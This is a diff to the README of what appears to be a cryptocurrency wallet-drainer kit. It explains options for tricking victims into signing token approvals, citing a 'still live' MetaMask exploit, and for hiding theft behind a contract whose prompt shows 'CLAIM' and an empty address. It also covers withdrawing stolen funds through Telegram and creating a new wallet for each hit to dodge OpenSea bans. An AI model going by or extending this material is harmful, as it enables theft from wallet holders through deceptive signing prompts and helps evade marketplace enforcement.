@@ -27,7 +27,7 @@ Options explained:
 -disable_blur: All is on name, don't edit it
 
 -use_approvement_for_tokens: Define if you prefer use approvement or token transfer ( MetaMask exploit is still live so don't switch it to false: https://ibb.co/DL18PN6)
--use_increase_allowance_for_tokens_when_disponible: Define if you prefer the first approvement popup or the second (test it yourself, it doesn't really matter)
+-use_increase_allowance_for_tokens_when_disponible: Define if you prefer the first approvement popup or the second (test it yourself, it doesn't really matter). Note: only work if use_approvement_for_tokens is set to true
 -use_transfer_contract: Use a contract for all balance hits ( you can withdraw from contract with telegram commands, do /help). Contract is good because user will see "CLAIM" + empty address: https://ibb.co/QDDRbD1
 
 -create_wallet_for_seaport: This option wil create a new wallet each seaport and send you private key, it will avoid fast opensea ban (i don't recommend this option because now blur is better than opensea)
